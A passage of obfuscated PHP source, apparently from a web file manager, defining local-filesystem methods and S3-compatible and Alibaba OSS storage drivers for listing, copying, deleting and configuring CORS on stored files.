rtrim($›‚½õ‘›, $àõøìŒÑ[8]) . $àõøìŒÑ[8]; if ($Ã¦Ş£Ì) { $›‚½õ‘› = $this->iconvSystem($›‚½õ‘›); } if (!($şàÚ¿Ñ¿ = @opendir($›‚½õ‘›))) { return; } while (($ò×á²«Ø = readdir($şàÚ¿Ñ¿)) !== !1) { if ($ò×á²«Ø == $àõøìŒÑ[95] || $ò×á²«Ø == $àõøìŒÑ[1300]) { continue; } $«Ÿƒö¬Ş = $›‚½õ‘› . $ò×á²«Ø; if (is_file($«Ÿƒö¬Ş) || is_link($«Ÿƒö¬Ş)) { $ÀªôùÒÜ[$àõøìŒÑ[79]]++; $ÀªôùÒÜ[$àõøìŒÑ[78]] += filesize_64($«Ÿƒö¬Ş); } else { if (is_dir($«Ÿƒö¬Ş)) { $ÀªôùÒÜ[$àõøìŒÑ[80]]++; $this->infoChildren($«Ÿƒö¬Ş, $ÀªôùÒÜ, !1); } } } closedir($şàÚ¿Ñ¿); } private function folderInfo($È´ÄÄäŞ, $Âà°Õ»Ä = false) { $¢¦µˆí =& $_SERVER[Ù×¯Ø…]; $È´ÄÄäŞ = rtrim($È´ÄÄäŞ, $¢¦µˆí[8]) . $¢¦µˆí[8]; $¿áã® = $this->iconvApp($this->pathThis($È´ÄÄäŞ)); if ($Âà°Õ»Ä) { return array($¢¦µˆí[28] => $¿áã®, $¢¦µˆí[76] => $this->getPathOuter($È´ÄÄäŞ), $¢¦µˆí[29] => $¢¦µˆí[77]); } $éÖ°•Å² = array($¢¦µˆí[28] => $¿áã®, $¢¦µˆí[76] => $this->getPathOuter($È´ÄÄäŞ), $¢¦µˆí[29] => $¢¦µˆí[77], $¢¦µˆí[194] => @filectime($È´ÄÄäŞ), $¢¦µˆí[84] => @filemtime($È´ÄÄäŞ), $¢¦µˆí[1303] => @fileatime($È´ÄÄäŞ), $¢¦µˆí[1304] => is_readable($È´ÄÄäŞ), $¢¦µˆí[1305] => is_writable($È´ÄÄäŞ), $¢¦µˆí[1306] => get_mode($È´ÄÄäŞ)); return $éÖ°•Å²; } private function fileInfo($˜áØüÚô, $â½¿«»Ğ = false) { $…Øå„æ— =& $_SERVER[Ù×¯Ø…]; $§œı—ó† = $this->iconvApp($this->pathThis($˜áØüÚô)); if ($â½¿«»Ğ) { return array($…Øå„æ—[28] => $§œı—ó†, $…Øå„æ—[76] => $this->getPathOuter($˜áØüÚô), $…Øå„æ—[29] => $…Øå„æ—[193], $…Øå„æ—[78] => $this->size($˜áØüÚô), $…Øå„æ—[168] => $this->ext($§œı—ó†)); } $ôİÅÂÂ« = array($…Øå„æ—[28] => $§œı—ó†, $…Øå„æ—[76] => $this->getPathOuter($˜áØüÚô), $…Øå„æ—[29] => $…Øå„æ—[193], $…Øå„æ—[194] => @filectime($˜áØüÚô), $…Øå„æ—[84] => @filemtime($˜áØüÚô), $…Øå„æ—[1303] => @fileatime($˜áØüÚô), $…Øå„æ—[78] => $this->size($˜áØüÚô), $…Øå„æ—[168] => $this->ext($§œı—ó†), $…Øå„æ—[1304] => is_readable($˜áØüÚô), $…Øå„æ—[1305] => is_writable($˜áØüÚô), $…Øå„æ—[1306] => get_mode($˜áØüÚô)); return $ôİÅÂÂ«; } public function exist($Æóˆõ”™) { $Æóˆõ”™ = $this->iconvSystem($Æóˆõ”™); return @file_exists($Æóˆõ”™); } public function isFile($®£È¸Ê‡) { $®£È¸Ê‡ = $this->iconvSystem($®£È¸Ê‡); return @is_file($®£È¸Ê‡); } public function isFolder($Ö  è×´) { $Ö  è×´ = $this->iconvSystem($Ö  è×´); return @is_dir($Ö  è×´); } public function listPath($ì¨µŒıÃ, $ğèå´¢í = false) { $À¬™Äİõ =& $_SERVER[Ù×¯Ø…]; $ì¨µŒıÃ = $this->iconvSystem($ì¨µŒıÃ); $ì¨µŒıÃ = rtrim($ì¨µŒıÃ, $À¬™Äİõ[8]) . $À¬™Äİõ[8]; $ê¡ïñı© = array($À¬™Äİõ[75] => array(), $À¬™Äİõ[74] => array()); if (!($â¬“Ü‹Ô = @opendir($ì¨µŒıÃ))) { return $ê¡ïñı©; } while (($©Í¸ŒØÎ = readdir($â¬“Ü‹Ô)) !== !1) { if ($©Í¸ŒØÎ == $À¬™Äİõ[95] || $©Í¸ŒØÎ == $À¬™Äİõ[1300]) { continue; } $¬¦Öâ÷œ = $ì¨µŒıÃ . $©Í¸ŒØÎ; if (is_file($¬¦Öâ÷œ)) { $ê¡ïñı©[$À¬™Äİõ[74]][] = $this->fileInfo($¬¦Öâ÷œ, $ğèå´¢í); } else { $ê¡ïñı©[$À¬™Äİõ[75]][] = $this->folderInfo($¬¦Öâ÷œ, $ğèå´¢í); } } closedir($â¬“Ü‹Ô); return $ê¡ïñı©; } public function listAll($°úÛƒø, &$õíÇ×³¹ = array()) { $¬Úãˆá =& $_SERVER[Ù×¯Ø…]; $°úÛƒø = $this->iconvSystem($°úÛƒø); $°úÛƒø = rtrim($°úÛƒø, $¬Úãˆá[8]) . $¬Úãˆá[8]; if (!($¿çôèÓë = @opendir($°úÛƒø))) { return $õíÇ×³¹; } while (($Œ»²Ìª¾ = readdir($¿çôèÓë)) !== !1) { if ($Œ»²Ìª¾ == $¬Úãˆá[95] || $Œ»²Ìª¾ == $¬Úãˆá[1300]) { continue; } $¨ÍçÏ¿æ = $°úÛƒø . $Œ»²Ìª¾; if (is_dir($¨ÍçÏ¿æ) && !is_link($¨ÍçÏ¿æ)) { $õíÇ×³¹[] = array($¬Úãˆá[76] => $¨ÍçÏ¿æ . $¬Úãˆá[8], $¬Úãˆá[77] => 1, $¬Úãˆá[84] => @filemtime($¨ÍçÏ¿æ), $¬Úãˆá[78] => 0); $this->listAll($¨ÍçÏ¿æ, $õíÇ×³¹); } else { $õíÇ×³¹[] = array($¬Úãˆá[76] => $¨ÍçÏ¿æ, $¬Úãˆá[77] => 0, $¬Úãˆá[84] => @filemtime($¨ÍçÏ¿æ), $¬Úãˆá[78] => $this->size($¨ÍçÏ¿æ)); } } closedir($¿çôèÓë); return $õíÇ×³¹; } public function has($±Õè×ìË, $ŒóıŒ¨ = false, $ûÎúÎãı = true) { $·‡À¢ã =& $_SERVER[Ù×¯Ø…]; $±Õè×ìË = $this->iconvSystem($±Õè×ìË); $±Õè×ìË = rtrim($±Õè×ìË, $·‡À¢ã[8]) . $·‡À¢ã[8]; if (!($óÁ¤¦ä = @opendir($±Õè×ìË))) { return !1; } $ÀÔ¶İæ• = 0; $Úó‚Şûù = 0; $‘ƒÅ¦íÍ = 0; while (($î™íïÌ = readdir($óÁ¤¦ä)) !== !1) { if ($î™íïÌ == $·‡À¢ã[95] || $î™íïÌ == $·‡À¢ã[1300]) { continue; } $À•°•äº = $±Õè×ìË . $î™íïÌ; if ($ŒóıŒ¨) { $‘ƒÅ¦íÍ++; if (@is_file($À•°•äº)) { $ÀÔ¶İæ•++; } else { $Úó‚Şûù++; } if ($‘ƒÅ¦íÍ > 10000) { break; } continue; } if ($ûÎúÎãı) { if (@is_file($À•°•äº)) { return !0; } } else { if (@is_dir($À•°•äº . $·‡À¢ã[8])) { return !0; } } } closedir($óÁ¤¦ä); if ($ŒóıŒ¨) { return array($·‡À¢ã[203] => $ÀÔ¶İæ•, $·‡À¢ã[204] => $Úó‚Şûù); } return !1; } public function hashSimple($şÃúöôı) { $Æ¨Šœ¹ =& $_SERVER[Ù×¯Ø…]; if (!$şÃúöôı) { return md5($Æ¨Šœ¹[33]); } $şÃúöôı = $this->iconvSystem($şÃúöôı); $ãŠÀˆú¾ = $this->size($şÃúöôı); $»ƒ‡â·Ş = 200; $Ğô†õÃÈ = 50; if ($ãŠÀˆú¾ <= $»ƒ‡â·Ş * $Ğô†õÃÈ) { return $this->hashMd5($şÃúöôı) . $ãŠÀˆú¾; } $ßÏ‰ûÈ¶ = $Æ¨Šœ¹[33]; $ˆúÏîî¾ = intval($ãŠÀˆú¾ / $Ğô†õÃÈ); $²ÓÅæÈî = fopen($şÃúöôı, $Æ¨Šœ¹[1307]); if (!$²ÓÅæÈî) { return $ßÏ‰ûÈ¶; } for ($öò¡ò‹ = 0; $öò¡ò‹ < $Ğô†õÃÈ; $öò¡ò‹++) { fseek_64($²ÓÅæÈî, $ˆúÏîî¾ * $öò¡ò‹); $ßÏ‰ûÈ¶ .= fread($²ÓÅæÈî, $»ƒ‡â·Ş); } fseek_64($²ÓÅæÈî, $ãŠÀˆú¾ - $»ƒ‡â·Ş); $ßÏ‰ûÈ¶ .= fread($²ÓÅæÈî, $»ƒ‡â·Ş); fclose($²ÓÅæÈî); return md5($ßÏ‰ûÈ¶) . $ãŠÀˆú¾; } public function getContent($ïã¼Ñ®ş) { $ïã¼Ñ®ş = $this->iconvSystem($ïã¼Ñ®ş); return file_get_contents($ïã¼Ñ®ş); } public function setContent($—²ï‹™, $¯·±šù¢ = '') { $—²ï‹™ = $this->iconvSystem($—²ï‹™); $•ï½ß¯Ì = @file_put_contents($—²ï‹™, $¯·±šù¢, LOCK_EX); clearstatcache(); @chmod($—²ï‹™, $this->pathAuth); return $•ï½ß¯Ì === !1 ? !1 : !0; } public function fileSubstr($ú²Œï—Ä, $è×ºû–¨ = 0, $¹ìä»ß‹ = false) { $ÖãÃªÜ¶ =& $_SERVER[Ù×¯Ø…]; $ú²Œï—Ä = $this->iconvSystem($ú²Œï—Ä); if ($¹ìä»ß‹ === !1) { $¹ìä»ß‹ = $this->size($ú²Œï—Ä); } if ($¹ìä»ß‹ <= 0) { return $ÖãÃªÜ¶[33]; } $Û‚Á¹Àº = fopen($ú²Œï—Ä, $ÖãÃªÜ¶[1307]); if (!$Û‚Á¹Àº) { return !1; } fseek_64($Û‚Á¹Àº, $è×ºû–¨); $ƒÖÄã¶˜ = fread($Û‚Á¹Àº, $¹ìä»ß‹); fclose($Û‚Á¹Àº); return $ƒÖÄã¶˜; } public function upload($ìÎ“°‹ë, $–ÕıŞ¢’, $Á¢ëÛÈ‹ = false, $£üù¶ûÒ = REPEAT_REPLACE) { if ($Á¢ëÛÈ‹) { return $this->moveFile($–ÕıŞ¢’, $ìÎ“°‹ë); } return $this->copyFile($–ÕıŞ¢’, $ìÎ“°‹ë); } public function setModifyTime($†¸ã«”¹, $‹‡ˆª¯ = '') { @touch($†¸ã«”¹, intval($‹‡ˆª¯)); } public function download($çø¯Ï¾—, $Š®°‡¹Œ) { return $this->iconvSystem($çø¯Ï¾—); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($û–Ò¢º‹) { parent::__construct($û–Ò¢º‹); $this->signatureVersion($_SERVER[Ù×¯Ø…][212]); } public function fileOutLink($ğŞò¬‰) { $§æ´ÄÎÑ =& $_SERVER[Ù×¯Ø…]; if (substr($ğŞò¬‰, 0, 7) == $§æ´ÄÎÑ[1251]) { $ğŞò¬‰ = $§æ´ÄÎÑ[1252] . substr($ğŞò¬‰, 7); } header($§æ´ÄÎÑ[159] . $ğŞò¬‰); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($é³Ôõ­) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ù×¯Ø…][1308]; $this->_init($é³Ôõ­); } public function _init($šö–èÛ) { $º¨½º =& $_SERVER[Ù×¯Ø…]; foreach ($šö–èÛ as $³ö„Ôáƒ => $¹¯à¨‹Ó) { if (isset($this->{$³ö„Ôáƒ})) { $this->{$³ö„Ôáƒ} = $¹¯à¨‹Ó; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($º¨½º[1309] . LNG($º¨½º[1310])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ñµ“Ê‡ƒ =& $_SERVER[Ù×¯Ø…]; $±ø¡Ó„ê = new OSS\Model\CorsConfig(); $ğ€¬Ë— = new OSS\Model\CorsRule(); $ğ€¬Ë—->addAllowedOrigin($ñµ“Ê‡ƒ[1311]); $ğ€¬Ë—->addAllowedMethod($ñµ“Ê‡ƒ[1312]); $ğ€¬Ë—->addAllowedMethod($ñµ“Ê‡ƒ[1313]); $ğ€¬Ë—->addAllowedMethod($ñµ“Ê‡ƒ[1314]); $ğ€¬Ë—->addAllowedMethod($ñµ“Ê‡ƒ[1315]); $ğ€¬Ë—->addAllowedMethod($ñµ“Ê‡ƒ[158]); $ğ€¬Ë—->setMaxAgeSeconds(600); $ğ€¬Ë—->addExposeHeader($ñµ“Ê‡ƒ[1316]); $ğ€¬Ë—->addAllowedHeader($ñµ“Ê‡ƒ[1311]); $±ø¡Ó„ê->addRule($ğ€¬Ë—); try { $this->client->putBucketCors($this->bucket, $±ø¡Ó„ê); } catch (OSS\Core\OssException $Ü†“ÅÜò) { return !1; } return !0; } public function getBucketCors() { $•ôìóà› =& $_SERVER[Ù×¯Ø…]; $ò©Î­ª = null; try { $ò©Î­ª = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ªì‚÷ª) { return null; } if (!$ò©Î­ª || !($‰®½„¸™ = $ò©Î­ª->getRules())) { return null; } $×ïëäÍç = $‰®½„¸™[0]->getAllowedOrigins(); $¨îÕŸÜş = $‰®½„¸™[0]->getAllowedMethods(); $Î€—ÖëŞ = $‰®½„¸™[0]->getMaxAgeSeconds(); $ï»„³ƒó = $‰®½„¸™[0]->getExposeHeaders(); $ôêöÈ™ = $‰®½„¸™[0]->getAllowedHeaders(); return array($•ôìóà›[181] => isset($×ïëäÍç[0]) ? $×ïëäÍç[0] : $•ôìóà›[33], $•ôìóà›[185] => $¨îÕŸÜş, $•ôìóà›[1317] => $Î€—ÖëŞ, $•ôìóà›[1318] => isset($ï»„³ƒó[0]) ? $ï»„³ƒó[0] : $•ôìóà›[33], $•ôìóà›[183] => isset($ôêöÈ™[0]) ? $ôêöÈ™[0] : $•ôìóà›[33]); } public function isBucketCors() { $ÔÕó¦¶À =& $_SERVER[Ù×¯Ø…]; $¼äƒø™ñ = $this->getBucketCors(); if (!$¼äƒø™ñ || !is_array($¼äƒø™ñ)) { return !1; } if ($¼äƒø™ñ[$ÔÕó¦¶À[181]] != $ÔÕó¦¶À[182] || $¼äƒø™ñ[$ÔÕó¦¶À[183]] != $ÔÕó¦¶À[182]) { return !1; } $€îš¢ïŠ = array_map($ÔÕó¦¶À[184], $¼äƒø™ñ[$ÔÕó¦¶À[185]]); if (!is_array($€îš¢ïŠ)) { $€îš¢ïŠ = array(); } $Ï¼¨Ôó = array($ÔÕó¦¶À[186], $ÔÕó¦¶À[187], $ÔÕó¦¶À[188], $ÔÕó¦¶À[189], $ÔÕó¦¶À[190]); $´¤§¼Ë° = array_diff($Ï¼¨Ôó, $€îš¢ïŠ); return empty($´¤§¼Ë°); } public function mkfile($²¡ô÷´£, $ëÏ‘šŞ = '', $Ö©ÒãÍ = REPEAT_RENAME) { $¯÷½®ñË = $this->setContent($²¡ô÷´£, $ëÏ‘šŞ); if ($¯÷½®ñË !== !1) { return $this->getPathOuter($²¡ô÷´£); } return !1; } public function mkdir($ßËŒå, $‡ñËâ­é = REPEAT_SKIP) { if ($this->_isFolder($ßËŒå)) { return $this->getPathOuter($ßËŒå); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ßËŒå)); } catch (OSS\Core\OssException $úˆæÇÄ–) { return !1; } return $this->getPathOuter($ßËŒå); } private function fileList($²á½¥ìÂ, $­¼ÄÂÍó = '', $¦ƒ£À¯õ = 0) { $“®©¼Şß =& $_SERVER[Ù×¯Ø…]; $²á½¥ìÂ = trim($²á½¥ìÂ, $“®©¼Şß[8]); $¹—İÌÉï = empty($²á½¥ìÂ) && $²á½¥ìÂ !== $“®©¼Şß[191] ? $“®©¼Şß[33] : $²á½¥ìÂ . $“®©¼Şß[8]; $ÑÈŞ†ÃÆ = $“®©¼Şß[33]; $Ö†ûÓ™ = 1000; $ÀĞª©øå = $this->listItemCache === !1 ? !1 : !0; $¯ß ŞîÖ = $¯Àæı²Æ = array(); while (!0) { check_abort(); $”Ø®¶ö³ = array($“®©¼Şß[1319] => $­¼ÄÂÍó, $“®©¼Şß[1320] => $¹—İÌÉï, $“®©¼Şß[1321] => $Ö†ûÓ™, $“®©¼Şß[1322] => $ÑÈŞ†ÃÆ); try { $èëıÖù‰ = $this->client->listObjects($this->bucket, $”Ø®¶ö³); } catch (OSS\Core\OssException $ö®ÒÛ‰ı) { break; } $ÑÈŞ†ÃÆ = $èëıÖù‰->getNextMarker(); $ñŒÚÄ¬ = $èëıÖù‰->getObjectList(); $¾£²Êé = $èëıÖù‰->getPrefixList(); foreach ($ñŒÚÄ¬ as $¦şóÅøØ) { if ($¦şóÅøØ->getKey() == $¹—İÌÉï) { continue; } $‘ı¡•›£ = $¦şóÅøØ->getKey(); $¸²¨÷Í¢ = $¦şóÅøØ->getSize(); $Á ªüçÉ = $¦şóÅøØ->getLastModified(); $õ§Ôµ§‹ = $¦ƒ£À¯õ ? array($“®©¼Şß[28] => $‘ı¡•›£, $“®©¼Şß[78] => $¸²¨÷Í¢, $“®©¼Şß[197] => strtotime($Á ªüçÉ)) : $‘ı¡•›£; $”İ¤í‚ = $¸²¨÷Í¢ == 0 && substr($‘ı¡•›£, strlen($‘ı¡•›£) - 1, 1) == $“®©¼Şß[8] ? !0 : !1; if ($ÀĞª©øå) { $this->cacheMethod($“®©¼Şß[199], $‘ı¡•›£, $”İ¤í‚); $this->cacheMethod($“®©¼Şß[200], $‘ı¡•›£, array($“®©¼Şß[78] => $¸²¨÷Í¢, $“®©¼Şß[1323] => $¸²¨÷Í¢, $“®©¼Şß[84] => strtotime($Á ªüçÉ), $“®©¼Şß[1324] => $Á ªüçÉ)); } if ($”İ¤í‚) { $¯ß ŞîÖ[] = $‘ı¡•›£; continue; } $¯Àæı²Æ[] = $õ§Ôµ§‹; } foreach ($¾£²Êé as $Áš×¸Û‘) { $¯ß ŞîÖ[] = $Áš×¸Û‘->getPrefix(); if ($ÀĞª©øå) { $this->cacheMethod($“®©¼Şß[199], $‘ı¡•›£, !0); } } if ($ÑÈŞ†ÃÆ === $“®©¼Şß[33]) { break; } } if ($ÀĞª©øå) { $this->cacheMethod($“®©¼Şß[199], $²á½¥ìÂ, !0); } return array($“®©¼Şß[75] => $¯ß ŞîÖ, $“®©¼Şß[74] => $¯Àæı²Æ); } public function copyFile($›ßôËèÒ, $¥‡İÎˆ¥) { $¬‚Ñµ‹î = $this->size($›ßôËèÒ); if ($¬‚Ñµ‹î < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $›ßôËèÒ, $this->bucket, $this->pathEncode($¥‡İÎˆ¥)); } catch (OSS\Core\OssException $ëÈ·ïÚ×) { return !1; } return $this->getPathOuter($¥‡İÎˆ¥); } $íã»½§Ü = $this->multiCopyObject($›ßôËèÒ, $¥‡İÎˆ¥, $¬‚Ñµ‹î); return $íã»½§Ü ? $this->getPathOuter($¥‡İÎˆ¥) : !1; } private function multiCopyObject($÷¬ÂüåË, $‚Õ”êç , $¦Ë’¹óË) { $¨ÑùÒ¾ =& $_SERVER[Ù×¯Ø…]; try { $ÀÅÏá˜§ = array(); if ($­Î”í÷² = $this->hashMd5($÷¬ÂüåË)) { $ÀÅÏá˜§ = array(OSS\OssClient::OSS_HEADERS => array($¨ÑùÒ¾[1325] => $­Î”í÷²)); } $ˆĞ˜¬…ñ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‚Õ”êç ), $ÀÅÏá˜§); $…úéä“ = 1; $ÍÄÄ¿ù = 0; $ğ‡šÔªë = array(); $€±å¾¬… = 1024 * 1024 * 10; $°®²úÜ = $this->client->generateMultiuploadParts($¦Ë’¹óË, $€±å¾¬…); foreach ($°®²úÜ as $¾½ÁÉ³» => $ù°Û´•¾) { $ı§¿‡ò = $ÍÄÄ¿ù + (int) $ù°Û´•¾[$¨ÑùÒ¾[1326]]; $“´šíè¢ = (int) $ù°Û´•¾[$¨ÑùÒ¾[335]] + $ı§¿‡ò - 1; $àêè˜óé = array($¨ÑùÒ¾[1327] => $ı§¿‡ò, $¨ÑùÒ¾[1328] => $“´šíè¢); $ğ‡šÔªë[] = $this->client->uploadPartCopy($this->bucket, $÷¬ÂüåË, $this->bucket, $this->pathEncode($‚Õ”êç ), $…úéä“, $ˆĞ˜¬…ñ, $àêè˜óé); $…úéä“ = $…úéä“ + 1; } $Ìø¶Çûñ = array(); foreach ($ğ‡šÔªë as $¾½ÁÉ³» => $úïÀóÂï) { $Ìø¶Çûñ[] = array($¨ÑùÒ¾[1329] => $¾½ÁÉ³» + 1, $¨ÑùÒ¾[1330] => $úïÀóÂï); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($‚Õ”êç ), $ˆĞ˜¬…ñ, $Ìø¶Çûñ); } catch (OSS\Core\OssException $Ö¬Ç‚ÃÆ) { return !1; } return !0; } public function moveFile($ºî¦à¢€, $±ö ğÓ«) { if ($this->copyFile($ºî¦à¢€, $±ö ğÓ«)) { $this->remove($ºî¦à¢€); return $this->getPathOuter($±ö ğÓ«); } return !1; } public function delFile($æ‡ìùû) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($æ‡ìùû)); } catch (OSS\Core\OssException $«šéš€¹) { return !1; } return !0; } public function delFolder($¦ŸÂÄÃü) { $ÔµÂÍŸê =& $_SERVER[Ù×¯Ø…]; if (!$this->exist($¦ŸÂÄÃü)) { return !0; } $this->listItemCache = !1; $ºûÅÒè‘ = $this->fileList($¦ŸÂÄÃü); $this->listItemCache = !0; $¢Ñû…Ù² = trim($¦ŸÂÄÃü, $ÔµÂÍŸê[8]) . $ÔµÂÍŸê[8]; if (!empty($¦ŸÂÄÃü) && $¦ŸÂÄÃü !== $ÔµÂÍŸê[191] && !in_array($¢Ñû…Ù², $ºûÅÒè‘[$ÔµÂÍŸê[75]])) { $ºûÅÒè‘[$ÔµÂÍŸê[75]][] = $¢Ñû…Ù²; } $ªûæÃ­Õ = $this->delByBatch($ºûÅÒè‘[$ÔµÂÍŸê[74]]); if (!$ªûæÃ­Õ) { return !1; } $ªûæÃ­Õ = $this->delByBatch($ºûÅÒè‘[$ÔµÂÍŸê[75]]); if (!$ªûæÃ­Õ) { return !1; } return $this->delFile($¢Ñû…Ù²); } private function delByBatch($¤Ñ†ø) { foreach (array_chunk($¤Ñ†ø, 1000) as $çéŠ€î) { try { $this->client->deleteObjects($this->bucket, $çéŠ€î); } catch (OSS\Core\OssException $à¯›Ø‰æ) { return !1; } } return !0; } public function rename($Í®‡¡ãï, $ûÜ ¥«û) { return $this->renameObject($Í®‡¡ãï, $ûÜ ¥«û); } private function fileInfo($šëï¡Ä, $ãÁ…†Ğ = false, $İÔŒóİ = array()) { $×èÀ ş— =& $_SERVER[Ù×¯Ø…]; $±´œöòÕ = array($×èÀ ş—[28] => $this->pathThis($šëï¡Ä), $×èÀ ş—[76] => $this->getPathOuter($šëï¡Ä), $×èÀ ş—[29] => $×èÀ ş—[193], $×èÀ ş—[78] => isset($İÔŒóİ[$×èÀ ş—[78]]) ? $İÔŒóİ[$×èÀ ş—[78]] : 0, $×èÀ ş—[168] => $this->ext($šëï¡Ä)); if ($ãÁ…†Ğ) { return $±´œöòÕ; } $±´œöòÕ[$×èÀ ş—[194]] = $±´œöòÕ[$×èÀ ş—[84]] = 0; $±´œöòÕ[$×èÀ ş—[195]] = $±´œöòÕ[$×èÀ ş—[196]] = !0; if (empty($İÔŒóİ)) { $¶‡æ÷Ş× = $this->objectMeta($šëï¡Ä); if (!$¶‡æ÷Ş×) { return $±´œöòÕ; } $İÔŒóİ = array($×èÀ ş—[84] => strtotime($¶‡æ÷Ş×[$×èÀ ş—[1324]]), $×èÀ ş—[78] => $¶‡æ÷Ş×[$×èÀ ş—[1323]] + 0); } if (isset($İÔŒóİ[$×èÀ ş—[78]])) { $±´œöòÕ[$×èÀ ş—[78]] = $İÔŒóİ[$×èÀ ş—[78]]; } if (isset($İÔŒóİ[$×èÀ ş—[84]])) { $±´œöòÕ[$×èÀ ş—[84]] = $İÔŒóİ[$×èÀ ş—[84]]; } if (isset($İÔŒóİ[$×èÀ ş—[197]]) && !trim($±´œöòÕ[$×èÀ ş—[84]])) { $±´œöòÕ[$×èÀ ş—[84]] = $İÔŒóİ[$×èÀ ş—[197]]; } return $±´œöòÕ; } private function folderInfo($…ü¾ç†ù, $Àš”¼ò = false, $Ÿ¬Å’† = array()) { $ŠÏÒíå¯ =& $_SERVER[Ù×¯Ø…]; $ô¼„à½« = array($ŠÏÒíå¯[28] => $this->pathThis($…ü¾ç†ù), $ŠÏÒíå¯[76] => $this->getPathOuter($ŠÏÒíå¯[8] . $…ü¾ç†ù), $ŠÏÒíå¯[29] => $ŠÏÒíå¯[77]); if ($Àš”¼ò) { return $ô¼„à½«; } $ô¼„à½«[$ŠÏÒíå¯[194]] = $ô¼„à½«[$ŠÏÒíå¯[84]] = 0; $ô¼„à½«[$ŠÏÒíå¯[195]] = $ô¼„à½«[$ŠÏÒíå¯[196]] = !0; if (empty($Ÿ¬Å’†)) { $…ü¾ç†ù = rtrim($…ü¾ç†ù, $ŠÏÒíå¯[8]) . $ŠÏÒíå¯[8]; $™Óı§Àú = $this->objectMeta($…ü¾ç†ù); if (!$™Óı§Àú) { return $ô¼„à½«; } $Ÿ¬Å’† = array($ŠÏÒíå¯[194] => $™Óı§Àú[$ŠÏÒíå¯[514]][$ŠÏÒíå¯[1331]], $ŠÏÒíå¯[84] => strtotime($™Óı§Àú[$ŠÏÒíå¯[1324]])); } if (isset($Ÿ¬Å’†[$ŠÏÒíå¯[84]])) { $ô¼„à½«[$ŠÏÒíå¯[84]] = $Ÿ¬Å’†[$ŠÏÒíå¯[84]]; } if (isset($Ÿ¬Å’†[$ŠÏÒíå¯[194]])) { $ô¼„à½«[$ŠÏÒíå¯[194]] = $Ÿ¬Å’†[$ŠÏÒíå¯[194]]; } return $ô¼„à½«; } public function listPath($¶§ÖÈ‡, $ ¸ìÇ˜¹ = false) { $ŸÇ¨­Ü„ =& $_SERVER[Ù×¯Ø…]; $àÓòÂä¡ = $this->fileList($¶§ÖÈ‡, $ŸÇ¨­Ü„[8], !0); foreach ($àÓòÂä¡[$ŸÇ¨­Ü„[75]] as $¥ş²’ ‡ => $•—Ï²†) { $àÓòÂä¡[$ŸÇ¨­Ü„[75]][$¥ş²’ ‡] = $this->folderInfo($•—Ï²†, $ ¸ìÇ˜¹, $•—Ï²†); } foreach ($àÓòÂä¡[$ŸÇ¨­Ü„[74]] as $¥ş²’ ‡ => $•—Ï²†) { $àÓòÂä¡[$ŸÇ¨­Ü„[74]][$¥ş²’ ‡] = $this->fileInfo($•—Ï²†[$ŸÇ¨­Ü„[28]], $ ¸ìÇ˜¹, $•—Ï²†); } return $àÓòÂä¡; } public function has($·Î¨ë¡º, $²ûºĞÍ¿ = false, $ÙßØæš³ = true) { $¡Ûëü» =& $_SERVER[Ù×¯Ø…]; $·Î¨ë¡º = trim($·Î¨ë¡º, $¡Ûëü»[8]); $Ôı˜ŒŞ = empty($·Î¨ë¡º) && $·Î¨ë¡º !== $¡Ûëü»[191] ? $¡Ûëü»[33] : $·Î¨ë¡º . $¡Ûëü»[8]; $„‡§»±‰ = $¡Ûëü»[33]; $Àƒ¬—ÖÜ = 500; $Á½î™è¦ = $­ÕÂó¾Ñ = 0; while (!0) { check_abort(); $¸±Ÿ¨ƒ¤ = array($¡Ûëü»[1319] => $¡Ûëü»[8], $¡Ûëü»[1320] => $Ôı˜ŒŞ, $¡Ûëü»[1321] => $Àƒ¬—ÖÜ, $¡Ûëü»[1322] => $„‡§»±‰); try { $İ áâğ = $this->client->listObjects($this->bucket, $¸±Ÿ¨ƒ¤); } catch (OSS\Core\OssException $Óâ„Éˆµ) { break; } $„‡§»±‰ = $İ áâğ->getNextMarker(); $Õ¼çèÇ¾ = $İ áâğ->getObjectList(); $š¡ª‚·© = $İ áâğ->getPrefixList(); if ($²ûºĞÍ¿) { if (count($Õ¼çèÇ¾) > 1 || count($Õ¼çèÇ¾) == 1 && $Õ¼çèÇ¾[0]->getKey() != $Ôı˜ŒŞ) { $Á½î™è¦ += count($Õ¼çèÇ¾) - 1; } if (!empty($š¡ª‚·©)) { $­ÕÂó¾Ñ += count($š¡ª‚·©); } if ($„‡§»±‰ === $¡Ûëü»[33]) { break; } continue; } if ($ÙßØæš³) { if (!empty($Õ¼çèÇ¾)) { if (count($Õ¼çèÇ¾) > 1 || $Õ¼çèÇ¾[0]->getKey() != $Ôı˜ŒŞ) { return !0; } } } else { if (!empty($š¡ª‚·©)) { return !0; } } if ($„‡§»±‰ === $¡Ûëü»[33]) { break; } } if ($²ûºĞÍ¿) { return array($¡Ûëü»[203] => $Á½î™è¦, $¡Ûëü»[204] => $­ÕÂó¾Ñ); } return !1; } public function listAll($®ıÄÏŞŒ) { $íÖßñë… =& $_SERVER[Ù×¯Ø…]; $ªşîÇ°Ä = $this->fileList($®ıÄÏŞŒ, $íÖßñë…[33], !0); $ß¨×¯¶í = array(); foreach ($ªşîÇ°Ä[$íÖßñë…[74]] as $Â“š™ê¤) { $ß¨×¯¶í[$Â“š™ê¤[$íÖßñë…[28]]] = $Â“š™ê¤[$íÖßñë…[78]]; } foreach ($ªşîÇ°Ä[$íÖßñë…[75]] as $Â“š™ê¤) { if (is_string($Â“š™ê¤)) { $ß¨×¯¶í[$Â“š™ê¤] = 0; } } return $this->listAllFiles($®ıÄÏŞŒ, array_keys($ß¨×¯¶í), $ß¨×¯¶í); } public function canRead($‘ÙÄõ÷) { $ŠÆ‹”ÊÜ =& 